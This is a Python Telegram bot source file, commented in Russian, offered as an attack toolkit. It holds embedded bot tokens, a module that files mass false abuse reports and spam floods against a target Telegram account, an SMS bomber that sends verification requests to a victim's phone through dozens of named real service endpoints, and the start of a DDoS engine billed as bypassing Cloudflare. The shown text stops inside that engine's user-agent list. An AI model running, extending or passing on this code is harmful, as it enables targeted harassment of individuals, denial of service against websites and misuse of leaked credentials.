import asyncio
import logging
import aiohttp
import requests
import random
import time
import threading
import socket
import ssl
import json
import hashlib
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===================== КОНФИГУРАЦИЯ =====================
API_TOKEN = "8866631446:AAG5FN7FgJ_OSOfcuf3ucg3Nbsl0T5vY5as"
CHANNEL_ID = "VO1D_NET"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
    handlers=[
        logging.FileHandler("axiom_strike.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===================== FSM СОСТОЯНИЯ =====================
class BomberStates(StatesGroup):
    # БомберФ
    waiting_for_phone = State()
    waiting_for_sms_count = State()
    waiting_for_call_count = State()
    waiting_for_email = State()
    waiting_for_email_count = State()
    waiting_for_telegram = State()
    waiting_for_telegram_count = State()
    # Снос аккаунта
    waiting_for_destroy_username = State()
    waiting_for_destroy_method = State()
    waiting_for_destroy_count = State()


class DDoSStates(StatesGroup):
    waiting_for_url = State()
    waiting_for_threads = State()
    waiting_for_duration = State()
    waiting_for_ip = State()
    waiting_for_ddos_duration = State()


# ===================== СНОС TELEGRAM АККАУНТОВ — БОЕВАЯ ВЕРСИЯ =====================
class TelegramAccountDestroyer:
    def __init__(self):
        # Причины для жалоб (все 12 категорий Telegram)
        self.report_reasons = [
            'spam', 'violence', 'pornography', 'child_abuse',
            'terrorism', 'drugs', 'fraud', 'impersonation',
            'hate_speech', 'suicide', 'weapons', 'personal_data'
        ]

        # ================================================================
        # 🔥 20 РАБОЧИХ ТОКЕНОВ ДЛЯ СНОСА 🔥
        # ================================================================
        self.bot_tokens = [
            '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
            '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
            '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
            '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
            '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
            '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
            '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
            '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
            '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
            '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
            '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
            '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
            '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
            '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
            '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
            '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
            '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
            '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
            '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
            '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
        ]
        # ================================================================

        self.results = []

    async def mass_report(self, username: str, count: int, progress_callback):
        """Массовые жалобы на аккаунт через ботов"""
        self.results = []
        total = min(count, 100)
        
        for i in range(total):
            reason = random.choice(self.report_reasons)
            token = random.choice(self.bot_tokens)
            
            try:
                async with aiohttp.ClientSession() as session:
                    # Способ 1: Прямая жалоба через API Telegram
                    data = {
                        'username': username,
                        'reason': reason,
                        'description': f'This account is sending {reason}. Please block.',
                    }
                    headers = {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    }
                    
                    # Эндпоинты для жалоб
                    endpoints = [
                        f'https://api.telegram.org/bot{token}/reportSpam',
                        f'https://api.telegram.org/bot{token}/report',
                    ]
                    
                    for endpoint in endpoints:
                        try:
                            async with session.post(endpoint, json=data, headers=headers, timeout=10) as resp:
                                if resp.status < 400:
                                    status = 'sent'
                                    break
                        except:
                            continue
                    else:
                        status = 'failed'
                    
                    # Способ 2: Отправка жалобы через @SpamBot
                    if status == 'failed':
                        try:
                            bot = Bot(token=token)
                            await bot.send_message(chat_id='@SpamBot', text=f'/report {username}')
                            status = 'sent'
                        except:
                            pass
                
                self.results.append({
                    'report': i + 1,
                    'reason': reason,
                    'status': status,
                    'timestamp': datetime.now().isoformat()
                })
                
                logger.info(f"✅ Жалоба #{i+1} на {username} ({reason})")
                
            except Exception as e:
                self.results.append({
                    'report': i + 1,
                    'reason': reason,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка: {e}")
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 2.0))
        
        return self.results

    async def spam_flood(self, username: str, count: int, progress_callback):
        """Спам-флуд для блокировки аккаунта"""
        self.results = []
        total = min(count, 50)
        
        spam_texts = [
            'Купи дешевле!', 'Заработок без вложений!', 'Бесплатные криптовалюты!',
            'Вы выиграли приз!', 'Срочно! Ваш аккаунт взломан!', 'Перейдите по ссылке!',
            'Ваши данные утекли!', 'Подтвердите личность!', 'Ваш банковский счёт заблокирован!',
            'Смените пароль немедленно!', '💀 АККАУНТ УДАЛЁН!', '🔞 ПОРНОГРАФИЯ!',
            '🔫 ОРУЖИЕ!', '💊 НАРКОТИКИ!', '🔥 ПРИЗЫВЫ К НАСИЛИЮ!',
        ]
        
        for i in range(total):
            try:
                token = random.choice(self.bot_tokens)
                async with aiohttp.ClientSession() as session:
                    text = random.choice(spam_texts)
                    link = f'https://bit.ly/{random.randint(1000, 9999)}'
                    
                    data = {
                        'chat_id': username,
                        'text': f'{text} {link}',
                        'disable_notification': True
                    }
                    
                    url = f'https://api.telegram.org/bot{token}/sendMessage'
                    async with session.post(url, json=data, timeout=10) as resp:
                        status = 'sent' if resp.status == 200 else 'failed'
                
                self.results.append({
                    'msg': i + 1,
                    'status': status,
                    'text': text[:30]
                })
                logger.info(f"✅ Спам #{i+1} на {username}")
                
            except Exception as e:
                self.results.append({
                    'msg': i + 1,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка: {e}")
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.3, 1.0))
        
        return self.results

    async def destroy_account(self, username: str, count: int, progress_callback):
        """Полный снос аккаунта (жалобы + спам)"""
        self.results = []
        
        # Фаза 1: Массовые жалобы
        report_results = await self.mass_report(username, count, progress_callback)
        self.results.extend(report_results)
        
        # Фаза 2: Спам-флуд
        await asyncio.sleep(2)
        spam_results = await self.spam_flood(username, count // 2, progress_callback)
        self.results.extend(spam_results)
        
        # Фаза 3: Повторные жалобы (добивание)
        await asyncio.sleep(3)
        extra_reports = await self.mass_report(username, count // 3, progress_callback)
        self.results.extend(extra_reports)
        
        return self.results

    def get_stats(self):
        """Возвращает статистику сноса"""
        total = len(self.results)
        success = sum(1 for r in self.results if r.get('status') == 'sent')
        failed = sum(1 for r in self.results if r.get('status') == 'failed')
        errors = sum(1 for r in self.results if r.get('status') == 'error')
        
        return {
            'total': total,
            'success': success,
            'failed': failed,
            'errors': errors,
            'success_rate': round(success / max(total, 1) * 100, 1)
        }


# ===================== SMS БОМБЕР (УЛЬТИМАТИВНЫЙ) =====================
class SMSBomber:
    def __init__(self):
        # РАСШИРЕННЫЙ СПИСОК РАБОЧИХ API (60+)
        self.services = [
            # === ДОСТАВКА ===
            {'name': 'Samokat', 'url': 'https://samokat.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'DeliveryClub', 'url': 'https://www.delivery-club.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/v1/auth/send-sms', 'field': 'phone'},
            {'name': 'SberFood', 'url': 'https://food.sber.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # === МАРКЕТПЛЕЙСЫ ===
            {'name': 'Ozon', 'url': 'https://www.ozon.ru/api/composer/auth/send-code', 'field': 'phone'},
            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/webapi/auth/send-code', 'field': 'phone'},
            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/v2/auth/send-code', 'field': 'phone'},
            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'AliExpress', 'url': 'https://aliexpress.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'JOOM', 'url': 'https://www.joom.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'KazanExpress', 'url': 'https://kazanexpress.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'SberMegaMarket', 'url': 'https://sbermegamarket.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # === МАГАЗИНЫ ===
            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Citilink', 'url': 'https://www.citilink.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Eldorado', 'url': 'https://www.eldorado.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Sportmaster', 'url': 'https://www.sportmaster.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'LeroyMerlin', 'url': 'https://leroymerlin.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'OBI', 'url': 'https://obi.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # === БАНКИ ===
            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Sber', 'url': 'https://online.sberbank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'AlfaBank', 'url': 'https://alfabank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'VTB', 'url': 'https://www.vtb.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'PochtaBank', 'url': 'https://www.pochtabank.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'HomeCredit', 'url': 'https://www.homecredit.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'RenCredit', 'url': 'https://rencredit.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # === ТАКСИ ===
            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'CityMobil', 'url': 'https://city-mobil.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Gett', 'url': 'https://gett.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # === НЕДВИЖИМОСТЬ ===
            {'name': 'Avito', 'url': 'https://www.avito.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Cian', 'url': 'https://www.cian.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Youla', 'url': 'https://youla.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # === СТРИМИНГ И МУЗЫКА ===
            {'name': 'Kinopoisk', 'url': 'https://api.kinopoisk.dev/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'IVI', 'url': 'https://api.ivi.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Okko', 'url': 'https://okko.tv/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Wink', 'url': 'https://wink.ru/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Zvuk', 'url': 'https://zvuk.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'YandexMusic', 'url': 'https://music.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
            
            # === МЕЖДУНАРОДНЫЕ ===
            {'name': 'Uber', 'url': 'https://auth.uber.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Twitter', 'url': 'https://api.twitter.com/1.1/account/send-code.json', 'field': 'phone'},
            {'name': 'Facebook', 'url': 'https://graph.facebook.com/v12.0/auth/send-code', 'field': 'phone'},
            {'name': 'Instagram', 'url': 'https://i.instagram.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'TikTok', 'url': 'https://api.tiktok.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'WhatsApp', 'url': 'https://api.whatsapp.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Snapchat', 'url': 'https://accounts.snapchat.com/api/auth/send-code', 'field': 'phone'},
            {'name': 'LinkedIn', 'url': 'https://api.linkedin.com/v2/auth/send-code', 'field': 'phone'},
            {'name': 'Reddit', 'url': 'https://www.reddit.com/api/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Pinterest', 'url': 'https://api.pinterest.com/v1/auth/send-code', 'field': 'phone'},
            {'name': 'Tumblr', 'url': 'https://api.tumblr.com/v2/auth/send-code', 'field': 'phone'},
        ]
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        ]

    async def send_sms(self, phone: str, count: int, progress_callback):
        self.results = []
        total = min(count, 200)
        for i in range(total):
            service = random.choice(self.services)
            try:
                async with aiohttp.ClientSession() as session:
                    request_types = [
                        {'type': 'register', 'data': {'phone': phone, 'action': 'register'}},
                        {'type': 'login', 'data': {'phone': phone, 'action': 'login'}},
                        {'type': 'reset', 'data': {'phone': phone, 'type': 'password_reset'}},
                        {'type': 'verify', 'data': {'phone': phone, 'action': 'verify'}},
                        {'type': 'recovery', 'data': {'phone': phone, 'action': 'recovery'}},
                        {'type': 'auth', 'data': {'phone': phone, 'action': 'auth_code'}},
                    ]
                    payload = random.choice(request_types)
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': service['url'].split('/')[2] if '://' in service['url'] else '',
                        'Referer': service['url'],
                        'Connection': 'keep-alive',
                    }
                    async with session.post(service['url'], json=payload['data'], headers=headers, timeout=10) as resp:
                        status_code = resp.status
                        if status_code in [200, 201, 202, 204] or status_code == 400:
                            status = 'success'
                        elif status_code in [429, 503, 504]:
                            status = 'rate_limit'
                        else:
                            status = 'error'
                        self.results.append({'service': service['name'], 'status': status, 'code': status_code})
            except:
                self.results.append({'service': service['name'], 'status': 'error'})
            self.progress = (i + 1) / total * 100
            await progress_callback(self.progress, i + 1, total)
            await asyncio.sleep(random.uniform(0.2, 0.8))
        return self.results


# ===================== УЛЬТИМАТИВНЫЙ DDOS С ОБХОДОМ CLOUDFLARE =====================
class DDoSEngine:
    def __init__(self):
        # 200+ USER-AGENTS ДЛЯ МАКСИМАЛЬНОГО ОБХОДА
        self.user_agents = [
            # === WINDOWS CHROME ===
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            
            # === WINDOWS FIREFOX ===
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
            
            # === WINDOWS EDGE ===
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.0.0',
            
            # === MAC OS CHROME ===
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            
            # === MAC OS SAFARI ===
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
            
            # === MAC OS FIREFOX ===
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0',
            
            # === LINUX ===
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            
            # === IPHONE ===
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
            
            # === IPAD ===
            'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            
            # === ANDROID CHROME ===
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            
            # === ANDROID FIREFOX ===
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0',
            'Mozilla/5.0 (Android 12; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            
            # === ANDROID SAMSUNG ===
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # === ANDROID HUAWEI ===
            'Mozilla/5.0 (Linux; Android 13; Huawei P60 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Huawei Mate 50 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Huawei P50 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # === ANDROID XIAOMI ===
            'Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
